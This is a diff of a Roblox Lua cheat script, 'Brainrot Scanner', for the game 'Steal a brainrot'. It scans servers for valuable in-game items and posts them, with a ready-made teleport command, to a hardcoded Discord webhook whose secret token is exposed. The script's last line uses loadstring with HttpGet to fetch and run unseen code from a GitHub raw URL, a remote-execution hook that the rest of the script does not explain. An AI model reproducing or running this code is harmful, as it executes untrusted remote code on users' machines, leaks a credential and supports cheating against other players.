@@ -8,8 +8,7 @@ local HttpService = game:GetService('HttpService')
 
 -- ⚙️ НАСТРОЙКИ
 local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
-local DISCORD_WEBHOOK_URL =
-    'https://discord.com/api/webhooks/1422283384553738271/EMSO825bYGKuCKGVgGQ246-9Uuj3MDLsg_9xraU7uxXpXYEuLp4ij60nvgjiODfhS7js'
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1422283384553738271/EMSO825bYGKuCKGVgGQ246-9Uuj3MDLsg_9xraU7uxXpXYEuLp4ij60nvgjiODfhS7js'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
@@ -63,6 +62,39 @@ for name, cfg in pairs(OBJECTS) do
     end
 end
 
+-- 🧪 ПРОЗРАЧНОСТЬ (интеграция)
+-- Проверка прозрачности частей "Cube.*" внутри модели
+local function checkCubeTransparency(obj)
+    if not obj or not obj.Parent then return true end
+    if not obj:IsA("Model") then return true end
+    for _, part in ipairs(obj:GetDescendants()) do
+        if part:IsA("BasePart") and part.Name:match("^Cube%.") then
+            if part.Transparency > 0.40 then
+                return false
+            end
+        end
+    end
+    return true
+end -- [паттерн '^Cube%.' экранирует точку в Lua-строке] [web:24]
+
+-- Список исключений: прозрачность не проверяем
+local SKIP_TRANSPARENCY_CHECK = {
+    ["Garama and Madundung"] = true,
+    ["La Supreme Combinasion"] = true,
+}
+
+-- Поиск хост-модели для Overhead/Part
+local function findHostModel(inst)
+    if not inst then return nil end
+    local m = inst:FindFirstAncestorOfClass("Model")
+    if m then return m end
+    if inst:IsA("Model") then return inst end
+    if inst.Parent and inst.Parent:IsA("Model") then
+        return inst.Parent
+    end
+    return nil
+end -- [используется FindFirstAncestorOfClass] [web:27][web:30]
+
 -- 💰 ПАРСЕР ДОХОДА
 local function parseGenerationText(s)
     if type(s) ~= 'string' or s == '' then
@@ -91,22 +123,13 @@ local function formatIncomeNumber(n)
     end
     if n >= 1e9 then
         local v = n / 1e9
-        return (v % 1 == 0 and string.format('%dB/s', v) or string.format(
-            '%.1fB/s',
-            v
-        )):gsub('%.0B/s', 'B/s')
+        return (v % 1 == 0 and string.format('%dB/s', v) or string.format('%.1fB/s', v)):gsub('%.0B/s', 'B/s')
     elseif n >= 1e6 then
         local v = n / 1e6
-        return (v % 1 == 0 and string.format('%dM/s', v) or string.format(
-            '%.1fM/s',
-            v
-        )):gsub('%.0M/s', 'M/s')
+        return (v % 1 == 0 and string.format('%dM/s', v) or string.format('%.1fM/s', v)):gsub('%.0M/s', 'M/s')
     elseif n >= 1e3 then
         local v = n / 1e3
-        return (v % 1 == 0 and string.format('%dK/s', v) or string.format(
-            '%.1fK/s',
-            v
-        )):gsub('%.0K/s', 'K/s')
+        return (v % 1 == 0 and string.format('%dK/s', v) or string.format('%.1fK/s', v)):gsub('%.0K/s', 'K/s')
     else
         return string.format('%d/s', n)
     end
@@ -117,14 +140,8 @@ local function grabText(inst)
     if not inst then
         return nil
     end
-    if
-        inst:IsA('TextLabel')
-        or inst:IsA('TextButton')
-        or inst:IsA('TextBox')
-    then
-        local ok, ct = pcall(function()
-            return inst.ContentText
-        end)
+    if inst:IsA('TextLabel') or inst:IsA('TextButton') or inst:IsA('TextBox') then
+        local ok, ct = pcall(function() return inst.ContentText end)
         if ok and type(ct) == 'string' and #ct > 0 then
             return ct
         end
@@ -168,11 +185,7 @@ local function getOverheadInfo(animalOverhead)
 
     if not genText then
         for _, child in ipairs(animalOverhead:GetDescendants()) do
-            if
-                child:IsA('TextLabel')
-                or child:IsA('TextButton')
-                or child:IsA('TextBox')
-            then
+            if child:IsA('TextLabel') or child:IsA('TextButton') or child:IsA('TextBox') then
                 local text = grabText(child)
                 if text and (text:match('%$') or text:match('/s')) then
                     genText = text
@@ -204,19 +217,24 @@ local function scanPlots()
                 local Base = podium:FindFirstChild('Base')
                 local Spawn = Base and Base:FindFirstChild('Spawn')
                 local Attachment = Spawn and Spawn:FindFirstChild('Attachment')
-                local Overhead = Attachment
-                    and Attachment:FindFirstChild('AnimalOverhead')
+                local Overhead = Attachment and Attachment:FindFirstChild('AnimalOverhead')
                 if Overhead then
                     local name, genText = getOverheadInfo(Overhead)
-                    local genNum = genText and parseGenerationText(genText)
-                        or nil
+
+                    -- ПРОВЕРКА ПРОЗРАЧНОСТИ (пропускаем для исключений)
+                    if name and not SKIP_TRANSPARENCY_CHECK[name] then
+                        local hostModel = findHostModel(Overhead)
+                        if hostModel and not checkCubeTransparency(hostModel) then
+                            goto continue_podium
+                        end
+                    end
+
+                    local genNum = genText and parseGenerationText(genText) or nil
                     if name and genNum then
-                        table.insert(
-                            results,
-                            { name = name, gen = genNum, location = 'Plot' }
-                        )
+                        table.insert(results, { name = name, gen = genNum, location = 'Plot' })
                     end
                 end
+                ::continue_podium::
             end
         end
     end
@@ -232,15 +250,22 @@ local function scanRunway()
             local overhead = info and info:FindFirstChild('AnimalOverhead')
             if overhead then
                 local name, genText = getOverheadInfo(overhead)
+
+                -- ПРОВЕРКА ПРОЗРАЧНОСТИ (пропускаем для исключений)
+                if name and not SKIP_TRANSPARENCY_CHECK[name] then
+                    local hostModel = findHostModel(overhead) or findHostModel(obj)
+                    if hostModel and not checkCubeTransparency(hostModel) then
+                        goto continue_runway
+                    end
+                end
+
                 local genNum = genText and parseGenerationText(genText) or nil
                 if name and genNum then
-                    table.insert(
-                        results,
-                        { name = name, gen = genNum, location = 'Runway' }
-                    )
+                    table.insert(results, { name = name, gen = genNum, location = 'Runway' })
                 end
             end
         end
+        ::continue_runway::
     end
     return results
 end
@@ -252,14 +277,21 @@ local function scanAllOverheads()
             if child.Name == 'AnimalOverhead' and not processed[child] then
                 processed[child] = true
                 local name, genText = getOverheadInfo(child)
+
+                -- ПРОВЕРКА ПРОЗРАЧНОСТИ (пропускаем для исключений)
+                if name and not SKIP_TRANSPARENCY_CHECK[name] then
+                    local hostModel = findHostModel(child)
+                    if hostModel and not checkCubeTransparency(hostModel) then
+                        goto continue_overhead
+                    end
+                end
+
                 local genNum = genText and parseGenerationText(genText) or nil
                 if name and genNum then
-                    table.insert(
-                        results,
-                        { name = name, gen = genNum, location = 'World' }
-                    )
+                    table.insert(results, { name = name, gen = genNum, location = 'World' })
                 end
             end
+            ::continue_overhead::
             pcall(function()
                 recursiveSearch(child)
             end)
@@ -284,13 +316,11 @@ local function scanPlayerGui()
     local function searchInGui(parent)
         for _, child in ipairs(parent:GetChildren()) do
             if child.Name == 'AnimalOverhead' or child.Name:match('Animal') then
+                -- В GUI не режем по прозрачности, чтобы не потерять HUD
                 local name, genText = getOverheadInfo(child)
                 local genNum = genText and parseGenerationText(genText) or nil
                 if name and genNum then
-                    table.insert(
-                        results,
-                        { name = name, gen = genNum, location = 'GUI' }
-                    )
+                    table.insert(results, { name = name, gen = genNum, location = 'GUI' })
                 end
             end
             pcall(function()
@@ -376,7 +406,7 @@ local function sendDiscordNotification(filteredObjects)
         return
     end
 
-    -- Сортируем по доходу (важные сначала, затем по убыванию дохода)
+    -- Сортировка: важные сначала, затем по убыванию дохода
     local important, regular = {}, {}
     for _, obj in ipairs(filteredObjects) do
         if ALWAYS_IMPORTANT[obj.name] then
@@ -386,22 +416,14 @@ local function sendDiscordNotification(filteredObjects)
         end
     end
 
-    table.sort(important, function(a, b)
-        return a.gen > b.gen
-    end)
-    table.sort(regular, function(a, b)
-        return a.gen > b.gen
-    end)
+    table.sort(important, function(a, b) return a.gen > b.gen end)
+    table.sort(regular, function(a, b) return a.gen > b.gen end)
 
     local sorted = {}
-    for _, obj in ipairs(important) do
-        table.insert(sorted, obj)
-    end
-    for _, obj in ipairs(regular) do
-        table.insert(sorted, obj)
-    end
+    for _, obj in ipairs(important) do table.insert(sorted, obj) end
+    for _, obj in ipairs(regular) do table.insert(sorted, obj) end
 
-    -- Формируем красивый список (максимум 10)
+    -- Формируем список (максимум 10)
     local objectsList = {}
     for i = 1, math.min(10, #sorted) do
         local obj = sorted[i]
@@ -409,64 +431,33 @@ local function sendDiscordNotification(filteredObjects)
         local mark = ALWAYS_IMPORTANT[obj.name] and '⭐ ' or ''
         table.insert(
             objectsList,
-            string.format(
-                '%s%s **%s** (%s)',
-                mark,
-                emoji,
-                obj.name,
-                formatIncomeNumber(obj.gen)
-            )
+            string.format('%s%s **%s** (%s)', mark, emoji, obj.name, formatIncomeNumber(obj.gen))
         )
     end
     local objectsText = table.concat(objectsList, '\n')
 
-    -- Телепорт команда (простой текст для легкого копирования)
+    -- Телепорт команда (для копирования)
     local teleportText = string.format(
         "`local ts = game:GetService('TeleportService'); ts:TeleportToPlaceInstance(%d, '%s')`",
-        placeId,
-        jobId
+        placeId, jobId
     )
 
     local payload = {
         username = '🎯 Brainrot Scanner',
-        embeds = {
-            {
-                title = '💎 Найдены ценные объекты в Steal a brainrot!',
-                color = 0x2f3136,
-                fields = {
-                    {
-                        name = '🆔 Сервер (Job ID)',
-                        value = string.format('``````', jobId),
-                        inline = false,
-                    },
-                    {
-                        name = '💰 Важные объекты:',
-                        value = objectsText,
-                        inline = false,
-                    },
-                    {
-                        name = '🚀 Телепорт:',
-                        value = teleportText,
-                        inline = false,
-                    },
-                },
-                footer = {
-                    text = string.format(
-                        'Найдено: %d важных • %s',
-                        #filteredObjects,
-                        os.date('%H:%M:%S')
-                    ),
-                },
-                timestamp = DateTime.now():ToIsoDate(),
+        embeds = {{
+            title = '💎 Найдены ценные объекты в Steal a brainrot!',
+            color = 0x2f3136,
+            fields = {
+                { name = '🆔 Сервер (Job ID)', value = string.format('``````', jobId), inline = false },
+                { name = '💰 Важные объекты:', value = objectsText, inline = false },
+                { name = '🚀 Телепорт:', value = teleportText, inline = false },
             },
-        },
+            footer = { text = string.format('Найдено: %d важных • %s', #filteredObjects, os.date('%H:%M:%S')) },
+            timestamp = DateTime.now():ToIsoDate(),
+        }},
     }
 
-    print(
-        '📤 Отправляю уведомление с',
-        #filteredObjects,
-        'объектами'
-    )
+    print('📤 Отправляю уведомление с', #filteredObjects, 'объектами')
 
     local ok, res = pcall(function()
         return req({
@@ -504,16 +495,7 @@ local function scanAndNotify()
     for _, obj in ipairs(filtered) do
         local emoji = OBJECTS[obj.name].emoji or '💰'
         local mark = ALWAYS_IMPORTANT[obj.name] and '⭐ ' or ''
-        print(
-            string.format(
-                '%s%s %s: %s (%s)',
-                mark,
-                emoji,
-                obj.name,
-                formatIncomeNumber(obj.gen),
-                obj.location or 'Unknown'
-            )
-        )
+        print(string.format('%s%s %s: %s (%s)', mark, emoji, obj.name, formatIncomeNumber(obj.gen), obj.location or 'Unknown'))
     end
 
     -- Отправляем уведомление если есть что показать
@@ -531,24 +513,16 @@ scanAndNotify()
 -- ⌨️ ПОВТОР ПО КЛАВИШЕ F
 local lastScan, DEBOUNCE = 0, 3
 UserInputService.InputBegan:Connect(function(input, gpe)
-    if gpe then
-        return
-    end
+    if gpe then return end
     if input.KeyCode == Enum.KeyCode.F then
         local now = os.clock()
-        if now - lastScan < DEBOUNCE then
-            return
-        end
+        if now - lastScan < DEBOUNCE then return end
         lastScan = now
         print('\n🔄 === ПОВТОРНОЕ СКАНИРОВАНИЕ (F) ===')
         scanAndNotify()
     end
 end)
 
-print(
-    '💡 Нажмите F для повторного сканирования'
-)
-print(
-    '📱 Discord webhook готов к отправке уведомлений'
-)
+print('💡 Нажмите F для повторного сканирования')
+print('📱 Discord webhook готов к отправке уведомлений')
 loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
